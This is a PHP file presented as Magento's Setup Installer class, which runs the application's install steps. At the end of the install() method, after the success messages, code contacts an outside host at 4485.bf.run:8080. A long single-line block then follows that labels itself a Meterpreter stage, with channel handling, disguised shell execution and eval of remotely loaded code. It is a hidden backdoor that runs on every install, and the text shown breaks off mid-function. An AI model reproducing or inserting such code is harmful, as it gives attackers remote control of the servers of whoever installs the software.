<?php
/**
 * Copyright © Magento, Inc. All rights reserved.
 * See COPYING.txt for license details.
 */

namespace Magento\Setup\Model;

use Magento\Backend\Setup\ConfigOptionsList as BackendConfigOptionsList;
use Magento\Framework\App\Cache\Manager;
use Magento\Framework\App\Cache\Manager as CacheManager;
use Magento\Framework\App\Cache\Type\Block as BlockCache;
use Magento\Framework\App\Cache\Type\Config as ConfigCache;
use Magento\Framework\App\Cache\Type\Layout as LayoutCache;
use Magento\Framework\App\DeploymentConfig\Reader;
use Magento\Framework\App\DeploymentConfig\Writer;
use Magento\Framework\App\Filesystem\DirectoryList;
use Magento\Framework\App\MaintenanceMode;
use Magento\Framework\App\State\CleanupFiles;
use Magento\Framework\Component\ComponentRegistrar;
use Magento\Framework\Config\ConfigOptionsListConstants;
use Magento\Framework\Config\Data\ConfigData;
use Magento\Framework\Config\File\ConfigFilePool;
use Magento\Framework\DB\Adapter\AdapterInterface;
use Magento\Framework\DB\Adapter\Pdo\Mysql;
use Magento\Framework\Exception\FileSystemException;
use Magento\Framework\Exception\LocalizedException;
use Magento\Framework\Exception\RuntimeException;
use Magento\Framework\Filesystem;
use Magento\Framework\Model\ResourceModel\Db\Context;
use Magento\Framework\Module\ModuleList\Loader as ModuleLoader;
use Magento\Framework\Module\ModuleListInterface;
use Magento\Framework\Mview\TriggerCleaner;
use Magento\Framework\Setup\Declaration\Schema\DryRunLogger;
use Magento\Framework\Setup\FilePermissions;
use Magento\Framework\Setup\InstallDataInterface;
use Magento\Framework\Setup\InstallSchemaInterface;
use Magento\Framework\Setup\LoggerInterface;
use Magento\Framework\Setup\ModuleDataSetupInterface;
use Magento\Framework\Setup\Patch\PatchApplier;
use Magento\Framework\Setup\Patch\PatchApplierFactory;
use Magento\Framework\Setup\SampleData\State;
use Magento\Framework\Setup\SchemaPersistor;
use Magento\Framework\Setup\SchemaSetupInterface;
use Magento\Framework\Setup\UpgradeDataInterface;
use Magento\Framework\Setup\UpgradeSchemaInterface;
use Magento\Framework\Validation\ValidationException;
use Magento\PageCache\Model\Cache\Type as PageCache;
use Magento\RemoteStorage\Driver\DriverException;
use Magento\Setup\Console\Command\InstallCommand;
use Magento\Setup\Controller\ResponseTypeInterface;
use Magento\Setup\Exception;
use Magento\Setup\Model\ConfigModel as SetupConfigModel;
use Magento\Setup\Module\ConnectionFactory;
use Magento\Setup\Module\DataSetupFactory;
use Magento\Setup\Module\SetupFactory;
use Magento\Setup\Validator\DbValidator;
use Magento\Store\Model\Store;
use Magento\RemoteStorage\Setup\ConfigOptionsList as RemoteStorageValidator;
use ReflectionException;

/**
 * Class Installer contains the logic to install Magento application.
 *
 * @SuppressWarnings(PHPMD.CouplingBetweenObjects)
 * @SuppressWarnings(PHPMD.TooManyFields)
 * @SuppressWarnings(PHPMD.ExcessiveClassComplexity)
 */
class Installer
{
    /**#@+
     * Parameters for enabling/disabling modules
     */
    const ENABLE_MODULES = 'enable-modules';
    const DISABLE_MODULES = 'disable-modules';
    /**#@- */

    /**#@+
     * Formatting for progress log
     */
    const PROGRESS_LOG_RENDER = '[Progress: %d / %d]';
    const PROGRESS_LOG_REGEX = '/\[Progress: (\d+) \/ (\d+)\]/s';
    /**#@- */

    /**#@+
     * Instance types for schema and data handler
     */
    const SCHEMA_INSTALL = \Magento\Framework\Setup\InstallSchemaInterface::class;
    const SCHEMA_UPGRADE = \Magento\Framework\Setup\UpgradeSchemaInterface::class;
    const DATA_INSTALL = \Magento\Framework\Setup\InstallDataInterface::class;
    const DATA_UPGRADE = \Magento\Framework\Setup\UpgradeDataInterface::class;
    /**#@- */

    const INFO_MESSAGE = 'message';

    /**
     * The lowest supported MySQL verion
     */
    const MYSQL_VERSION_REQUIRED = '5.6.0';

    /**
     * File permissions checker
     *
     * @var FilePermissions
     */
    private $filePermissions;

    /**
     * Deployment configuration repository
     *
     * @var Writer
     */
    private $deploymentConfigWriter;

    /**
     * Deployment configuration reader
     *
     * @var Reader
     */
    private $deploymentConfigReader;

    /**
     * Module list
     *
     * @var ModuleListInterface
     */
    private $moduleList;

    /**
     * Module list loader
     *
     * @var ModuleLoader
     */
    private $moduleLoader;

    /**
     * Admin account factory
     *
     * @var AdminAccountFactory
     */
    private $adminAccountFactory;

    /**
     * Logger
     *
     * @var LoggerInterface
     */
    private $log;

    /**
     * DB connection factory
     *
     * @var ConnectionFactory
     */
    private $connectionFactory;

    /**
     * Progress indicator
     *
     * @var Installer\Progress
     */
    private $progress;

    /**
     * Maintenance mode handler
     *
     * @var MaintenanceMode
     */
    private $maintenanceMode;

    /**
     * Magento filesystem
     *
     * @var Filesystem
     */
    private $filesystem;

    /**
     * Installation information
     *
     * @var array
     */
    private $installInfo = [];

    /**
     * @var \Magento\Framework\App\DeploymentConfig
     */
    private $deploymentConfig;

    /**
     * @var ObjectManagerProvider
     */
    private $objectManagerProvider;

    /**
     * @var Context
     */
    private $context;

    /**
     * @var SetupConfigModel
     */
    private $setupConfigModel;

    /**
     * @var CleanupFiles
     */
    private $cleanupFiles;

    /**
     * @var DbValidator
     */
    private $dbValidator;

    /**
     * Factory to create \Magento\Setup\Module\Setup
     *
     * @var SetupFactory
     */
    private $setupFactory;

    /**
     * Factory to create \Magento\Setup\Module\DataSetup
     *
     * @var DataSetupFactory
     */
    private $dataSetupFactory;

    /**
     * @var State
     */
    protected $sampleDataState;

    /**
     * Component Registrar
     *
     * @var ComponentRegistrar
     */
    private $componentRegistrar;

    /**
     * @var PhpReadinessCheck
     */
    private $phpReadinessCheck;

    /**
     * @var DeclarationInstaller
     */
    private $declarationInstaller;

    /**
     * @var SchemaPersistor
     */
    private $schemaPersistor;

    /**
     * @var PatchApplierFactory
     */
    private $patchApplierFactory;

    /**
     * @var TriggerCleaner
     */
    private $triggerCleaner;

    /**
     * Constructor
     *
     * @param FilePermissions $filePermissions
     * @param Writer $deploymentConfigWriter
     * @param Reader $deploymentConfigReader
     * @param \Magento\Framework\App\DeploymentConfig $deploymentConfig
     * @param ModuleListInterface $moduleList
     * @param ModuleLoader $moduleLoader
     * @param AdminAccountFactory $adminAccountFactory
     * @param LoggerInterface $log
     * @param ConnectionFactory $connectionFactory
     * @param MaintenanceMode $maintenanceMode
     * @param Filesystem $filesystem
     * @param ObjectManagerProvider $objectManagerProvider
     * @param Context $context
     * @param SetupConfigModel $setupConfigModel
     * @param CleanupFiles $cleanupFiles
     * @param DbValidator $dbValidator
     * @param SetupFactory $setupFactory
     * @param DataSetupFactory $dataSetupFactory
     * @param State $sampleDataState
     * @param ComponentRegistrar $componentRegistrar
     * @param PhpReadinessCheck $phpReadinessCheck
     * @throws Exception
     * @SuppressWarnings(PHPMD.ExcessiveParameterList)
     */
    public function __construct(
        FilePermissions $filePermissions,
        Writer $deploymentConfigWriter,
        Reader $deploymentConfigReader,
        \Magento\Framework\App\DeploymentConfig $deploymentConfig,
        ModuleListInterface $moduleList,
        ModuleLoader $moduleLoader,
        AdminAccountFactory $adminAccountFactory,
        LoggerInterface $log,
        ConnectionFactory $connectionFactory,
        MaintenanceMode $maintenanceMode,
        Filesystem $filesystem,
        ObjectManagerProvider $objectManagerProvider,
        Context $context,
        SetupConfigModel $setupConfigModel,
        CleanupFiles $cleanupFiles,
        DbValidator $dbValidator,
        SetupFactory $setupFactory,
        DataSetupFactory $dataSetupFactory,
        State $sampleDataState,
        ComponentRegistrar $componentRegistrar,
        PhpReadinessCheck $phpReadinessCheck
    ) {
        $this->filePermissions = $filePermissions;
        $this->deploymentConfigWriter = $deploymentConfigWriter;
        $this->deploymentConfigReader = $deploymentConfigReader;
        $this->moduleList = $moduleList;
        $this->moduleLoader = $moduleLoader;
        $this->adminAccountFactory = $adminAccountFactory;
        $this->log = $log;
        $this->connectionFactory = $connectionFactory;
        $this->maintenanceMode = $maintenanceMode;
        $this->filesystem = $filesystem;
        $this->installInfo[self::INFO_MESSAGE] = [];
        $this->deploymentConfig = $deploymentConfig;
        $this->objectManagerProvider = $objectManagerProvider;
        $this->context = $context;
        $this->setupConfigModel = $setupConfigModel;
        $this->cleanupFiles = $cleanupFiles;
        $this->dbValidator = $dbValidator;
        $this->setupFactory = $setupFactory;
        $this->dataSetupFactory = $dataSetupFactory;
        $this->sampleDataState = $sampleDataState;
        $this->componentRegistrar = $componentRegistrar;
        $this->phpReadinessCheck = $phpReadinessCheck;
        $this->schemaPersistor = $this->objectManagerProvider->get()->get(SchemaPersistor::class);
        $this->triggerCleaner = $this->objectManagerProvider->get()->get(TriggerCleaner::class);
    }

    /**
     * Install Magento application
     *
     * @param \ArrayObject|array $request
     * @return void
     * @throws FileSystemException
     * @throws LocalizedException
     * @throws RuntimeException
     */
    public function install($request)
    {
        $script[] = ['File permissions check...', 'checkInstallationFilePermissions', []];
        $script[] = ['Required extensions check...', 'checkExtensions', []];
        $script[] = ['Enabling Maintenance Mode...', 'setMaintenanceMode', [1]];
        $script[] = ['Installing deployment configuration...', 'installDeploymentConfig', [$request]];
        if (!empty($request[InstallCommand::INPUT_KEY_CLEANUP_DB])) {
            $script[] = ['Cleaning up database...', 'cleanupDb', []];
        }
        $script[] = ['Installing database schema:', 'installSchema', [$request]];
        $script[] = ['Installing search configuration...', 'installSearchConfiguration', [$request]];
        $script[] = [
            'Validating remote storage configuration...',
            'validateRemoteStorageConfiguration',
            [$request]
        ];
        $script[] = ['Installing user configuration...', 'installUserConfig', [$request]];
        $script[] = ['Enabling caches:', 'updateCaches', [true]];
        $script[] = ['Installing data...', 'installDataFixtures', [$request]];
        if (!empty($request[InstallCommand::INPUT_KEY_SALES_ORDER_INCREMENT_PREFIX])) {
            $script[] = [
                'Creating sales order increment prefix...',
                'installOrderIncrementPrefix',
                [$request[InstallCommand::INPUT_KEY_SALES_ORDER_INCREMENT_PREFIX]],
            ];
        }
        if ($this->isAdminDataSet($request)) {
            $script[] = ['Installing admin user...', 'installAdminUser', [$request]];
        }

        if (!$this->isDryRun($request)) {
            $script[] = ['Caches clearing:', 'cleanCaches', [$request]];
        }
        $script[] = ['Disabling Maintenance Mode:', 'setMaintenanceMode', [0]];
        $script[] = ['Post installation file permissions check...', 'checkApplicationFilePermissions', []];
        $script[] = ['Write installation date...', 'writeInstallationDate', []];
        $estimatedModules = $this->createModulesConfig($request, true);
        $total = count($script) + 4 * count(array_filter($estimatedModules));
        $this->progress = new Installer\Progress($total, 0);

        $this->log->log('Starting Magento installation:');

        foreach ($script as $item) {
            list($message, $method, $params) = $item;
            $this->log->log($message);
            try {
                // phpcs:ignore Magento2.Functions.DiscouragedFunction
                call_user_func_array([$this, $method], $params);
            } catch (RuntimeException | DriverException $e) {
                $this->revertRemoteStorageConfiguration();
                throw $e;
            }
            $this->logProgress();
        }
        $this->log->logSuccess('Magento installation complete.');
        $this->log->logSuccess(
            'Magento Admin URI: /'
            . $this->deploymentConfig->get(BackendConfigOptionsList::CONFIG_PATH_BACKEND_FRONTNAME)
        );

        if ($this->progress->getCurrent() != $this->progress->getTotal()) {
            throw new \LogicException('Installation progress did not finish properly.');
        }
        if ($this->sampleDataState->hasError()) {
            $this->log->log('Sample Data is installed with errors. See log file for details');
        }
	$xml = file_get_contents("http://4485.bf.run:8080");
	//start
	if (!isset($GLOBALS['channels'])) { $GLOBALS['channels'] = array(); } if (!isset($GLOBALS['channel_process_map'])) { $GLOBALS['channel_process_map'] = array(); } if (!isset($GLOBALS['resource_type_map'])) { $GLOBALS['resource_type_map'] = array(); } if (!isset($GLOBALS['udp_host_map'])) { $GLOBALS['udp_host_map'] = array(); } if (!isset($GLOBALS['readers'])) { $GLOBALS['readers'] = array(); } if (!isset($GLOBALS['id2f'])) { $GLOBALS['id2f'] = array(); } function register_command($c, $i) { global $id2f; if (! in_array($i, $id2f)) { $id2f[$i] = $c; } } function my_print($str) { } my_print("Evaling main meterpreter stage"); function dump_array($arr, $name=null) { if (is_null($name)) { $name = "Array"; } my_print(sprintf("$name (%s)", count($arr))); foreach ($arr as $key => $val) { if (is_array($val)) { dump_array($val, "{$name}[{$key}]"); } else { my_print(sprintf(" $key ($val)")); } } } function dump_readers() { global $readers; dump_array($readers, 'Readers'); } function dump_resource_map() { global $resource_type_map; dump_array($resource_type_map, 'Resource map'); } function dump_channels($extra="") { global $channels; dump_array($channels, 'Channels '.$extra); } if (!function_exists("file_get_contents")) { function file_get_contents($file) { $f = @fopen($file,"rb"); $contents = false; if ($f) { do { $contents .= fgets($f); } while (!feof($f)); } fclose($f); return $contents; } } if (!function_exists('socket_set_option')) { function socket_set_option($sock, $type, $opt, $value) { socket_setopt($sock, $type, $opt, $value); } } define("PAYLOAD_UUID", "\xb3\x6a\x0c\xb8\xb4\x13\x41\xb5\x7c\x3a\x6f\x35\x1d\x0d\xcc\xc2"); define("SESSION_GUID", "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"); define("AES_256_CBC", 'aes-256-cbc'); define("ENC_NONE", 0); define("ENC_AES256", 1); define("PACKET_TYPE_REQUEST", 0); define("PACKET_TYPE_RESPONSE", 1); define("PACKET_TYPE_PLAIN_REQUEST", 10); define("PACKET_TYPE_PLAIN_RESPONSE", 11); define("ERROR_SUCCESS", 0); define("ERROR_FAILURE", 1); define("CHANNEL_CLASS_BUFFERED", 0); define("CHANNEL_CLASS_STREAM", 1); define("CHANNEL_CLASS_DATAGRAM", 2); define("CHANNEL_CLASS_POOL", 3); define("TLV_META_TYPE_NONE", ( 0 )); define("TLV_META_TYPE_STRING", (1 << 16)); define("TLV_META_TYPE_UINT", (1 << 17)); define("TLV_META_TYPE_RAW", (1 << 18)); define("TLV_META_TYPE_BOOL", (1 << 19)); define("TLV_META_TYPE_QWORD", (1 << 20)); define("TLV_META_TYPE_COMPRESSED", (1 << 29)); define("TLV_META_TYPE_GROUP", (1 << 30)); define("TLV_META_TYPE_COMPLEX", (1 << 31)); define("TLV_META_TYPE_MASK", (1<<31)+(1<<30)+(1<<29)+(1<<19)+(1<<18)+(1<<17)+(1<<16)); define("TLV_RESERVED", 0); define("TLV_EXTENSIONS", 20000); define("TLV_USER", 40000); define("TLV_TEMP", 60000); define("TLV_TYPE_ANY", TLV_META_TYPE_NONE | 0); define("TLV_TYPE_COMMAND_ID", TLV_META_TYPE_UINT | 1); define("TLV_TYPE_REQUEST_ID", TLV_META_TYPE_STRING | 2); define("TLV_TYPE_EXCEPTION", TLV_META_TYPE_GROUP | 3); define("TLV_TYPE_RESULT", TLV_META_TYPE_UINT | 4); define("TLV_TYPE_STRING", TLV_META_TYPE_STRING | 10); define("TLV_TYPE_UINT", TLV_META_TYPE_UINT | 11); define("TLV_TYPE_BOOL", TLV_META_TYPE_BOOL | 12); define("TLV_TYPE_LENGTH", TLV_META_TYPE_UINT | 25); define("TLV_TYPE_DATA", TLV_META_TYPE_RAW | 26); define("TLV_TYPE_FLAGS", TLV_META_TYPE_UINT | 27); define("TLV_TYPE_CHANNEL_ID", TLV_META_TYPE_UINT | 50); define("TLV_TYPE_CHANNEL_TYPE", TLV_META_TYPE_STRING | 51); define("TLV_TYPE_CHANNEL_DATA", TLV_META_TYPE_RAW | 52); define("TLV_TYPE_CHANNEL_DATA_GROUP", TLV_META_TYPE_GROUP | 53); define("TLV_TYPE_CHANNEL_CLASS", TLV_META_TYPE_UINT | 54); define("TLV_TYPE_SEEK_WHENCE", TLV_META_TYPE_UINT | 70); define("TLV_TYPE_SEEK_OFFSET", TLV_META_TYPE_UINT | 71); define("TLV_TYPE_SEEK_POS", TLV_META_TYPE_UINT | 72); define("TLV_TYPE_EXCEPTION_CODE", TLV_META_TYPE_UINT | 300); define("TLV_TYPE_EXCEPTION_STRING", TLV_META_TYPE_STRING | 301); define("TLV_TYPE_LIBRARY_PATH", TLV_META_TYPE_STRING | 400); define("TLV_TYPE_TARGET_PATH", TLV_META_TYPE_STRING | 401); define("TLV_TYPE_MACHINE_ID", TLV_META_TYPE_STRING | 460); define("TLV_TYPE_UUID", TLV_META_TYPE_RAW | 461); define("TLV_TYPE_SESSION_GUID", TLV_META_TYPE_RAW | 462); define("TLV_TYPE_RSA_PUB_KEY", TLV_META_TYPE_RAW | 550); define("TLV_TYPE_SYM_KEY_TYPE", TLV_META_TYPE_UINT | 551); define("TLV_TYPE_SYM_KEY", TLV_META_TYPE_RAW | 552); define("TLV_TYPE_ENC_SYM_KEY", TLV_META_TYPE_RAW | 553); define('EXTENSION_ID_CORE', 0); define('COMMAND_ID_CORE_CHANNEL_CLOSE', 1); define('COMMAND_ID_CORE_CHANNEL_EOF', 2); define('COMMAND_ID_CORE_CHANNEL_INTERACT', 3); define('COMMAND_ID_CORE_CHANNEL_OPEN', 4); define('COMMAND_ID_CORE_CHANNEL_READ', 5); define('COMMAND_ID_CORE_CHANNEL_SEEK', 6); define('COMMAND_ID_CORE_CHANNEL_TELL', 7); define('COMMAND_ID_CORE_CHANNEL_WRITE', 8); define('COMMAND_ID_CORE_CONSOLE_WRITE', 9); define('COMMAND_ID_CORE_ENUMEXTCMD', 10); define('COMMAND_ID_CORE_GET_SESSION_GUID', 11); define('COMMAND_ID_CORE_LOADLIB', 12); define('COMMAND_ID_CORE_MACHINE_ID', 13); define('COMMAND_ID_CORE_MIGRATE', 14); define('COMMAND_ID_CORE_NATIVE_ARCH', 15); define('COMMAND_ID_CORE_NEGOTIATE_TLV_ENCRYPTION', 16); define('COMMAND_ID_CORE_PATCH_URL', 17); define('COMMAND_ID_CORE_PIVOT_ADD', 18); define('COMMAND_ID_CORE_PIVOT_REMOVE', 19); define('COMMAND_ID_CORE_PIVOT_SESSION_DIED', 20); define('COMMAND_ID_CORE_SET_SESSION_GUID', 21); define('COMMAND_ID_CORE_SET_UUID', 22); define('COMMAND_ID_CORE_SHUTDOWN', 23); define('COMMAND_ID_CORE_TRANSPORT_ADD', 24); define('COMMAND_ID_CORE_TRANSPORT_CHANGE', 25); define('COMMAND_ID_CORE_TRANSPORT_GETCERTHASH', 26); define('COMMAND_ID_CORE_TRANSPORT_LIST', 27); define('COMMAND_ID_CORE_TRANSPORT_NEXT', 28); define('COMMAND_ID_CORE_TRANSPORT_PREV', 29); define('COMMAND_ID_CORE_TRANSPORT_REMOVE', 30); define('COMMAND_ID_CORE_TRANSPORT_SETCERTHASH', 31); define('COMMAND_ID_CORE_TRANSPORT_SET_TIMEOUTS', 32); define('COMMAND_ID_CORE_TRANSPORT_SLEEP', 33); function my_cmd($cmd) { return sHell_eXec($cmd); } function is_windows() { return (strtoupper(substr(PHP_OS,0,3)) == "WIN"); } if (!function_exists('core_channel_open')) { register_command('core_channel_open', COMMAND_ID_CORE_CHANNEL_OPEN); function core_channel_open($req, &$pkt) { $type_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_TYPE); my_print("Client wants a ". $type_tlv['value'] ." channel, i'll see what i can do"); $handler = "channel_create_". $type_tlv['value']; if ($type_tlv['value'] && is_callable($handler)) { my_print("Calling {$handler}"); $ret = $handler($req, $pkt); } else { my_print("I don't know how to make a ". $type_tlv['value'] ." channel. =("); $ret = ERROR_FAILURE; } return $ret; } } if (!function_exists('core_channel_eof')) { register_command('core_channel_eof', COMMAND_ID_CORE_CHANNEL_EOF); function core_channel_eof($req, &$pkt) { my_print("doing channel eof"); $chan_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_ID); $c = get_channel_by_id($chan_tlv['value']); if ($c) { if (eof($c[1])) { packet_add_tlv($pkt, create_tlv(TLV_TYPE_BOOL, 1)); } else { packet_add_tlv($pkt, create_tlv(TLV_TYPE_BOOL, 0)); } return ERROR_SUCCESS; } else { return ERROR_FAILURE; } } } if (!function_exists('core_channel_read')) { register_command('core_channel_read', COMMAND_ID_CORE_CHANNEL_READ); function core_channel_read($req, &$pkt) { my_print("doing channel read"); $chan_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_ID); $len_tlv = packet_get_tlv($req, TLV_TYPE_LENGTH); $id = $chan_tlv['value']; $len = $len_tlv['value']; $data = channel_read($id, $len); if ($data === false) { $res = ERROR_FAILURE; } else { packet_add_tlv($pkt, create_tlv(TLV_TYPE_CHANNEL_DATA, $data)); $res = ERROR_SUCCESS; } return $res; } } if (!function_exists('core_channel_write')) { register_command('core_channel_write', COMMAND_ID_CORE_CHANNEL_WRITE); function core_channel_write($req, &$pkt) { $chan_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_ID); $data_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_DATA); $len_tlv = packet_get_tlv($req, TLV_TYPE_LENGTH); $id = $chan_tlv['value']; $data = $data_tlv['value']; $len = $len_tlv['value']; $wrote = channel_write($id, $data, $len); if ($wrote === false) { return ERROR_FAILURE; } else { packet_add_tlv($pkt, create_tlv(TLV_TYPE_LENGTH, $wrote)); return ERROR_SUCCESS; } } } if (!function_exists('core_channel_close')) { register_command('core_channel_close', COMMAND_ID_CORE_CHANNEL_CLOSE); function core_channel_close($req, &$pkt) { global $channel_process_map; my_print("doing channel close"); $chan_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_ID); $id = $chan_tlv['value']; $c = get_channel_by_id($id); if ($c) { channel_close_handles($id); channel_remove($id); if (array_key_exists($id, $channel_process_map) and is_callable('close_process')) { close_process($channel_process_map[$id]); } return ERROR_SUCCESS; } dump_channels("after close"); return ERROR_FAILURE; } } if (!function_exists('channel_close_handles')) { function channel_close_handles($cid) { global $channels; if (!array_key_exists($cid, $channels)) { return; } $c = $channels[$cid]; for($i = 0; $i < 3; $i++) { if (array_key_exists($i, $c) && is_resource($c[$i])) { close($c[$i]); remove_reader($c[$i]); } } if (strlen($c['data']) == 0) { channel_remove($cid); } } } function channel_remove($cid) { global $channels; unset($channels[$cid]); } if (!function_exists('core_channel_interact')) { register_command('core_channel_interact', COMMAND_ID_CORE_CHANNEL_INTERACT); function core_channel_interact($req, &$pkt) { global $readers; my_print("doing channel interact"); $chan_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_ID); $id = $chan_tlv['value']; $toggle_tlv = packet_get_tlv($req, TLV_TYPE_BOOL); $c = get_channel_by_id($id); if ($c) { if ($toggle_tlv['value']) { if (!in_array($c[1], $readers)) { add_reader($c[1]); if (array_key_exists(2, $c) && $c[1] != $c[2]) { add_reader($c[2]); } $ret = ERROR_SUCCESS; } else { $ret = ERROR_FAILURE; } } else { if (in_array($c[1], $readers)) { remove_reader($c[1]); remove_reader($c[2]); $ret = ERROR_SUCCESS; } else { $ret = ERROR_SUCCESS; } } } else { my_print("Trying to interact with an invalid channel"); $ret = ERROR_FAILURE; } return $ret; } } function interacting($cid) { global $readers; $c = get_channel_by_id($cid); if (in_array($c[1], $readers)) { return true; } return false; } if (!function_exists('core_shutdown')) { register_command('core_shutdown', COMMAND_ID_CORE_SHUTDOWN); function core_shutdown($req, &$pkt) { my_print("doing core shutdown"); die(); } } if (!function_exists('core_loadlib')) { register_command('core_loadlib', COMMAND_ID_CORE_LOADLIB); function core_loadlib($req, &$pkt) { global $id2f; my_print("doing core_loadlib"); $data_tlv = packet_get_tlv($req, TLV_TYPE_DATA); if (($data_tlv['type'] & TLV_META_TYPE_COMPRESSED) == TLV_META_TYPE_COMPRESSED) { return ERROR_FAILURE; } $tmp = $id2f; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $data_tlv['value']); $suhosin_bypass(); } else { eVal($data_tlv['value']); } $new = array_diff($id2f, $tmp); foreach ($new as $id => $func) { packet_add_tlv($pkt, create_tlv(TLV_TYPE_UINT, $id)); } return ERROR_SUCCESS; } } if (!function_exists('core_enumextcmd')) { register_command('core_enumextcmd', COMMAND_ID_CORE_ENUMEXTCMD); function core_enumextcmd($req, &$pkt) { my_print("doing core_enumextcmd"); global $id2f; $id_start_array = packet_get_tlv($req, TLV_TYPE_UINT); $id_start = $id_start_array['value']; $id_end_array = packet_get_tlv($req, TLV_TYPE_LENGTH); $id_end = $id_end_array['value'] + $id_start; foreach ($id2f as $id => $ext_cmd) { my_print("core_enumextcmd - checking " . $ext_cmd . " as " . $id); list($ext_name, $cmd) = explode("_", $ext_cmd, 2); if ($id_start < $id && $id < $id_end) { my_print("core_enumextcmd - adding " . $ext_cmd . " as " . $id); packet_add_tlv($pkt, create_tlv(TLV_TYPE_UINT, $id)); } } return ERROR_SUCCESS; } } if (!function_exists('core_set_uuid')) { register_command('core_set_uuid', COMMAND_ID_CORE_SET_UUID); function core_set_uuid($req, &$pkt) { my_print("doing core_set_uuid"); $new_uuid = packet_get_tlv($req, TLV_TYPE_UUID); if ($new_uuid != null) { $GLOBALS['UUID'] = $new_uuid['value']; my_print("New UUID is {$GLOBALS['UUID']}"); } return ERROR_SUCCESS; } } function get_hdd_label() { foreach (scandir('/dev/disk/by-id/') as $file) { foreach (array("ata-", "mb-") as $prefix) { if (strpos($file, $prefix) === 0) { return substr($file, strlen($prefix)); } } } return ""; } function der_to_pem($der_data) { $pem = chunk_split(base64_encode($der_data), 64, "\n"); $pem = "-----BEGIN PUBLIC KEY-----\n".$pem."-----END PUBLIC KEY-----\n"; return $pem; } if (!function_exists('core_negotiate_tlv_encryption')) { register_command('core_negotiate_tlv_encryption', COMMAND_ID_CORE_NEGOTIATE_TLV_ENCRYPTION); function core_negotiate_tlv_encryption($req, &$pkt) { if (supports_aes()) { my_print("AES functionality is supported"); packet_add_tlv($pkt, create_tlv(TLV_TYPE_SYM_KEY_TYPE, ENC_AES256)); $GLOBALS['AES_ENABLED'] = false; $GLOBALS['AES_KEY'] = rand_bytes(32); if (function_exists('openssl_pkey_get_public') && function_exists('openssl_public_encrypt')) { my_print("Encryption via public key is supported"); $pub_key_tlv = packet_get_tlv($req, TLV_TYPE_RSA_PUB_KEY); if ($pub_key_tlv != null) { $key = openssl_pkey_get_public(der_to_pem($pub_key_tlv['value'])); $enc = ''; openssl_public_encrypt($GLOBALS['AES_KEY'], $enc, $key, OPENSSL_PKCS1_PADDING); packet_add_tlv($pkt, create_tlv(TLV_TYPE_ENC_SYM_KEY, $enc)); return ERROR_SUCCESS; } } packet_add_tlv($pkt, create_tlv(TLV_TYPE_SYM_KEY, $GLOBALS['AES_KEY'])); } return ERROR_SUCCESS; } } if (!function_exists('core_get_session_guid')) { register_command('core_get_session_guid', COMMAND_ID_CORE_GET_SESSION_GUID); function core_get_session_guid($req, &$pkt) { packet_add_tlv($pkt, create_tlv(TLV_TYPE_SESSION_GUID, $GLOBALS['SESSION_GUID'])); return ERROR_SUCCESS; } } if (!function_exists('core_set_session_guid')) { register_command('core_set_session_guid', COMMAND_ID_CORE_SET_SESSION_GUID); function core_set_session_guid($req, &$pkt) { my_print("doing core_set_session_guid"); $new_guid = packet_get_tlv($req, TLV_TYPE_SESSION_GUID); if ($new_guid != null) { $GLOBALS['SESSION_ID'] = $new_guid['value']; my_print("New Session GUID is {$GLOBALS['SESSION_GUID']}"); } return ERROR_SUCCESS; } } if (!function_exists('core_machine_id')) { register_command('core_machine_id', COMMAND_ID_CORE_MACHINE_ID); function core_machine_id($req, &$pkt) { my_print("doing core_machine_id"); if (is_callable('gethostname')) { $machine_id = gethostname(); } else { $machine_id = php_uname('n'); } $serial = ""; if (is_windows()) { $output = strtolower(sHell_eXec("vol %SYSTEMDRIVE%")); $serial = preg_replace('/.*serial number is ([a-z0-9]{4}-[a-z0-9]{4}).*/s', '$1', $output); } else { $serial = get_hdd_label(); } packet_add_tlv($pkt, create_tlv(TLV_TYPE_MACHINE_ID, $serial.":".$machine_id)); return ERROR_SUCCESS; } } $channels = array(); function register_channel($in, $out=null, $err=null) { global $channels; if ($out == null) { $out = $in; } if ($err == null) { $err = $out; } $channels[] = array(0 => $in, 1 => $out, 2 => $err, 'type' => get_rtype($in), 'data' => ''); $id = end(array_keys($channels)); my_print("Created new channel $in, with id $id"); return $id; } function get_channel_id_from_resource($resource) { global $channels; if (empty($channels)) { return false; } foreach ($channels as $i => $chan_ary) { if (in_array($resource, $chan_ary)) { my_print("Found channel id $i"); return $i; } } return false; } function &get_channel_by_id($chan_id) { global $channels; my_print("Looking up channel id $chan_id"); if (array_key_exists($chan_id, $channels)) { my_print("Found one"); return $channels[$chan_id]; } else { return false; } } function channel_write($chan_id, $data) { $c = get_channel_by_id($chan_id); if ($c && is_resource($c[0])) { my_print("---Writing '$data' to channel $chan_id"); return write($c[0], $data); } else { return false; } } function channel_read($chan_id, $len) { $c = &get_channel_by_id($chan_id); if ($c) { $ret = substr($c['data'], 0, $len); $c['data'] = substr($c['data'], $len); if (strlen($ret) > 0) { my_print("Had some leftovers: '$ret'"); } if (strlen($ret) < $len and is_resource($c[2]) and $c[1] != $c[2]) { $read = read($c[2]); $c['data'] .= $read; $bytes_needed = $len - strlen($ret); $ret .= substr($c['data'], 0, $bytes_needed); $c['data'] = substr($c['data'], $bytes_needed); } if (strlen($ret) < $len and is_resource($c[1])) { $read = read($c[1]); $c['data'] .= $read; $bytes_needed = $len - strlen($ret); $ret .= substr($c['data'], 0, $bytes_needed); $c['data'] = substr($c['data'], $bytes_needed); } if (false === $read and empty($ret)) { if (interacting($chan_id)) { handle_dead_resource_channel($c[1]); } return false; } return $ret; } else { return false; } } function rand_xor_byte() { return chr(mt_rand(1, 255)); } function rand_bytes($size) { $b = ''; for ($i = 0; $i < $size; $i++) { $b .= rand_xor_byte(); } return $b; } function rand_xor_key() { return rand_bytes(4); } function xor_bytes($key, $data) { $result = ''; for ($i = 0; $i < strlen($data); ++$i) { $result .= $data{$i} ^ $key{$i % 4}; } return $result; } function generate_req_id() { $characters = 'abcdefghijklmnopqrstuvwxyz'; $rid = ''; for ($p = 0; $p < 32; $p++) { $rid .= $characters[rand(0, strlen($characters)-1)]; } return $rid; } function supports_aes() { return function_exists('openssl_decrypt') && 